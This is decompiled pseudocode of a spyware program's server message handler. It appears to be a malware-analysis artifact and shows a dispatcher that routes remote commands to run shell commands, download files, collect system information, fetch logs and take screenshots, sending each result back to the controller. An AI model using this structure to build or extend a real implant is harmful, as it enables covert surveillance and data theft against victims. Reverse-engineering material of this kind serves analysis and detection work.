long long spyware::communication::server::handle_message(struct_0 *a0, unsigned long long a1)
{
    int v0;  // [bp-0x338], Other Possible Types: unsigned long long
    unsigned long long v1;  // [bp-0x330]
    unsigned long v2;  // [bp-0x328], Other Possible Types: unsigned long long
    uint128_t v3;  // [bp-0x320]
    unsigned long long v4;  // [bp-0x300]
    unsigned long long v5;  // [bp-0x2f8]
    unsigned long long v6;  // [bp-0x2f0]
    unsigned long long v7;  // [bp-0x2e8]
    unsigned long long v8;  // [bp-0x2e0]
    int v9;  // [bp-0x2d8]
    unsigned long v10;  // [bp-0x2c8]
    int v11;  // [bp-0x2b8]
    int v12;  // [bp-0x2a8]
    unsigned long long v13;  // [bp-0x298]
    int v14;  // [bp-0x290]
    int v15;  // [bp-0x280]
    int v16;  // [bp-0x270]
    unsigned long long v17;  // [bp-0x260]
    unsigned long long v18;  // [bp-0x258]
    int v19;  // [bp-0x250]
    int v20;  // [bp-0x240]
    int v21;  // [bp-0x230]
    unsigned long long v22;  // [bp-0x220]
    unsigned long long v23;  // [bp-0x218]
    int v24;  // [bp-0x210]
    int v25;  // [bp-0x200]
    int v26;  // [bp-0x1f0]
    unsigned long long v27;  // [bp-0x1e0]
    unsigned long long v28;  // [bp-0x1d8]
    int v29;  // [bp-0x1d0]
    int v30;  // [bp-0x1c0]
    int v31;  // [bp-0x1b0]
    unsigned long long v32;  // [bp-0x1a0]
    int v33;  // [bp-0x198], Other Possible Types: char
    int v34;  // [bp-0x188]
    int v35;  // [bp-0x178]
    unsigned long long v36;  // [bp-0x168]
    int v37;  // [bp-0x160], Other Possible Types: char
    int v38;  // [bp-0x150]
    int v39;  // [bp-0x140]
    unsigned long long v40;  // [bp-0x130]
    int v41;  // [bp-0x128], Other Possible Types: char
    int v42;  // [bp-0x118]
    int v43;  // [bp-0x108]
    unsigned long long v44;  // [bp-0xf8]
    int v45;  // [bp-0xf0], Other Possible Types: char
    int v46;  // [bp-0xe0]
    int v47;  // [bp-0xd0]
    unsigned long long v48;  // [bp-0xc0]
    int v49;  // [bp-0xb8]
    int v50;  // [bp-0xa8]
    int v51;  // [bp-0x98]
    char v52;  // [bp-0x88]
    int v53;  // [bp-0x70], Other Possible Types: char
    int v54;  // [bp-0x60]
    int v55;  // [bp-0x50]
    char v56;  // [bp-0x40]
    unsigned int v59[4];  // rax
    unsigned long long v61;  // r15
    unsigned long long v63;  // rax
    unsigned long long v64;  // rsi
    char v65;  // bpl

    switch (a0->field_0 ^ 0x8000000000000000)
    {
    case 0:
        *((int128_t *)&v12) = *((int128_t *)((char *)&a0->field_8 + 8));
        *((int128_t *)&v11) = *((int128_t *)&(&a0->field_0)[1]);
        spyware::actions::commands::run_command_message(&v33, &v11);
        v17 = v36;
        v16 = v35;
        v15 = v34;
        v14 = v33;
        v13 = 9223372036854775809;
        spyware::communication::server::send_response(&v13, a1).unwrap(&g_4b8b20);
        switch (0x8000000000000000 ^ a0->field_0)
        {
        case 0: case 6: case 8:
LABEL_44ca1a:
            return v59;
        case 2: case 4:
LABEL_44ca0e:
            v59 = (unsigned long long)::0x44bd10::core::ptr::drop_in_place<spyware::communication::messages::DownloadFileRequest>(&(&a0->field_0)[1]);
        default:
            goto LABEL_44c9ff;
        }
    case 2:
        v10 = *((long long *)((char *)&a0->field_8 + 8));
        *((int128_t *)&v9) = *((int128_t *)&(&a0->field_0)[1]);
        spyware::actions::basic_info::download_file_message(&v37, &v9);
        v22 = v40;
        v21 = v39;
        v20 = v38;
        v19 = v37;
        v18 = 9223372036854775811;
        spyware::communication::server::send_response(&v18, a1).unwrap(&g_4b8b38);
        switch (0x8000000000000000 ^ a0->field_0)
        {
        case 0:
LABEL_44c9f1:
            v59 = (unsigned long long)::0x44bbe0::core::ptr::drop_in_place<spyware::communication::messages::ErrorInfo>(&(&a0->field_0)[1]);
            break;
        case 2: case 6: case 8:
            break;
        case 1: case 3: case 5: case 7:
            goto LABEL_44c9ff;
        case 4:
            goto LABEL_44ca0e;
        default:
            goto LABEL_44c9ff;
        }
    case 4:
        v2 = *((long long *)((char *)&a0->field_8 + 8));
        *((int128_t *)&v0) = *((int128_t *)&(&a0->field_0)[1]);
        spyware::actions::basic_info::get_basic_info_request(&v53);
        memcpy(&v52, &v56, 16);
        v51 = v55;
        v50 = v54;
        v49 = v53;
        spyware::communication::server::send_response(&v49, a1).unwrap(&g_4b8b50);
        ::0x44bd10::core::ptr::drop_in_place<spyware::communication::messages::DownloadFileRequest>(&(char)v0);
        v61 = 0x8000000000000000 ^ a0->field_0;
        break;
    case 6:
        spyware::actions::log_actions::get_logs_request(&v41);
        v27 = v44;
        v26 = v43;
        v25 = v42;
        v24 = v41;
        v23 = 9223372036854775815;
        v63 = spyware::communication::server::send_response(&v23, a1);
        v64 = &g_4b8b68;
        goto LABEL_44c9c7;
    case 8:
        spyware::actions::screenshot_actions::get_screenshot_request(&v45);
        v32 = v48;
        v31 = v47;
        v30 = v46;
        v29 = v45;
        v28 = 9223372036854775817;
        v63 = spyware::communication::server::send_response(&v28, a1);
        v64 = &g_4b8b80;
LABEL_44c9c7:
        v65 = 1;
        v63.unwrap(v64);
        v61 = 0x8000000000000000 ^ a0->field_0;
        if (v61 <= 8)
            goto LABEL_0x44c9e1;
        else
            goto LABEL_44c9ff;
    default:
        if (::0x44be40::core::sync::atomic::atomic_load())
        {
            v0 = &g_4b8b10;
            v1 = 1;
            v2 = 8;
            v3 = 0;
            v4 = "spyware::communication::serverUnrecognized message typeAn error occurred, terminating connection with . Error: ";
            v5 = 30;
            v6 = "spyware::communication::serverUnrecognized message typeAn error occurred, terminating connection with . Error: ";
            v7 = 30;
            v8 = log::__private_api::loc(&g_4b8b98);
            log::__private_api::log(&v0, 1, &v4);
        }
        v65 = 1;
        v61 = 0x8000000000000000 ^ a0->field_0;
        if (v61 <= 8)
            goto LABEL_0x44c9e1;
        else
            goto LABEL_44c9ff;
    }
    switch (v61)
    {
    case 4:
        if (!v65)
            goto LABEL_44ca1a;
        else
            goto LABEL_44ca0e;
    case 0:
        goto LABEL_44c9f1;
    case 1: case 3: case 5: case 7:
        goto LABEL_44c9ff;
    case 2:
        goto LABEL_44ca0e;
    case 6: case 8:
        break;
    default:
LABEL_44c9ff:
        v59 = ::0x44bb70::core::ptr::drop_in_place<spyware::communication::messages::Message>(a0);
        break;
    }
}
